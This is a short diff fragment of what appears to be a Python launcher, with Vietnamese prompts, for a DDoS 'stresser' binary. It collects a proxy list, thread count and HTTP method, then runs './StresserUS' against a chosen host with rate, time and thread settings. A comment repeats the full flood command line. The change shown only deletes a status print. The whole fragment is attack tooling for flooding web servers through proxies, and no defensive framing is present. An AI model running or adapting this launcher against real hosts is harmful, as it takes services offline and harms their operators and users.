@@ -16,7 +16,6 @@ proxyfile=input("  [+] Nhập file proxy (proxy.txt): ")
 THREADS=int(input("  [+] Nhập số luồng: "))
 METHOD=input("  [+] Nhập method (GET, POST, HEAD): ")
 print("=========================================")
-print("  Đã gửi yêu cầu\n")
 os.system(f"./StresserUS version=2 host={URL} limit={LIMIT} time={TIME} list={proxyfile} threads={THREADS} mode={METHOD}")
 input()
 #./StresserUS version=2 host=<url> limit=<rate> time=<time> list=<proxyfile> threads=<thread> mode=<GET/POST> cookie=<ddos=true> data=<post=true>
